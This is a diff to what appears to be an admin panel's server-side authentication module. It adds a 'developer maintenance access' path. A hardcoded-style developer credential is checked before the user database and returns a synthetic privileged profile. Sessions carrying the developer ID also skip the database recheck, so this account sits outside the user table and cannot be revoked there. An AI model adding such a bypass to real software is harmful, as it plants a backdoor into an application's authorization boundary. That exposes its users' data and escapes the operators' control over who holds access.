@@ -6,6 +6,11 @@ import {
   verificarSessao,
 } from '@/lib/sessao-token.mjs'
 import { podeExecutar, resolverPermissoes } from '@/lib/rbac.mjs'
+import {
+  ID_DESENVOLVEDOR,
+  ehCredencialDesenvolvedor,
+  perfilDesenvolvedor,
+} from '@/lib/server/acesso-desenvolvedor.mjs'
 
 /**
  * Sessão do Admin no servidor — a fronteira de autorização.
@@ -95,6 +100,11 @@ export const autenticar = async (
   nomeUsuario: string,
   senha: string,
 ): Promise<UsuarioAutorizado | null> => {
+  // Antes do banco: o acesso de manutenção não tem linha em `usuarios_sistema`,
+  // e conferi-lo primeiro garante que criar um usuário com o mesmo nome não
+  // sequestra o atalho. Ver specs/acesso-desenvolvedor.md.
+  if (ehCredencialDesenvolvedor(nomeUsuario, senha)) return perfilDesenvolvedor()
+
   const supabase = obterSupabaseAdmin()
   const { data, error } = await supabase.rpc('autenticar_usuario_admin', {
     p_nome_usuario: nomeUsuario,
@@ -124,6 +134,12 @@ export const lerSessao = async (request: NextRequest): Promise<ResultadoSessao> 
 
   const carga = verificarSessao(token, obterSegredo())
   if (!carga) return { ok: false, motivo: 'invalida' }
+
+  // O perfil sintético não tem linha para reconferir. A assinatura já provou a
+  // origem do cookie: sem o segredo ninguém escreve este id no payload.
+  if (carga.usuarioId === ID_DESENVOLVEDOR) {
+    return { ok: true, usuario: perfilDesenvolvedor() }
+  }
 
   const supabase = obterSupabaseAdmin()
   const { data, error } = await supabase.rpc('obter_sessao_admin', {
